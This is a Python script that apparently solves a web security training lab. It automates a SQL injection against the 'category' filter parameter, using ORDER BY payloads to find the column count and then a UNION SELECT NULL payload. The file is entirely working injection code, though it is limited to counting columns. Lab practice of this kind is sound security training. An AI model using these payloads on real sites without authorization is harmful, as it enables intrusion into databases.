import requests
import urllib3
from colorama import Fore

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection UNION attack, determining the number of columns returned by the query"

def sqli_column_number(url, proxies):
    path = "/filter?category=Gifts"
    for i in range(1, 50):
        sql_payload = "'+order+by+%s--" % i
        full_url = url.rstrip('/') + path + sql_payload
        try:
            r = requests.get(full_url, verify=False, proxies=proxies)
            if "Internal Server Error" in r.text:
                return i - 1
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed: {e}")
            return False
    return False

def run(url, payload=None, proxies=None):
    print(Fore.YELLOW + f"Steps to solve the lab:")
    print(Fore.WHITE + f"""1. Inject payload into 'category' query parameter to determine the number of columns\n2. Add one additional null column at a time\n3. Repeat this process, increasing the number of columns until you receive a valid response\n""")

    print("[+] Figuring out number of columns...")
    num_col = sqli_column_number(url, proxies)
    if num_col:
        print("[+] The number of columns is %d." % num_col)

        # Extra: Attempt basic UNION SELECT to trigger lab solved
        nulls = ",".join(["NULL"] * num_col)
        union_payload = f"' UNION SELECT {nulls}--"
        path = "/filter?category=Gifts"
        full_url = url.rstrip('/') + path + union_payload
        try:
            r = requests.get(full_url, verify=False, proxies=proxies)
            if r.status_code == 200 and "Internal Server Error" not in r.text:
                print("[+] Successfully injected UNION SELECT. Lab likely solved!")
                return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Error in UNION SELECT step: {e}")
        return False
    else:
        print("[-] The SQLi attack was not successful.")
        return False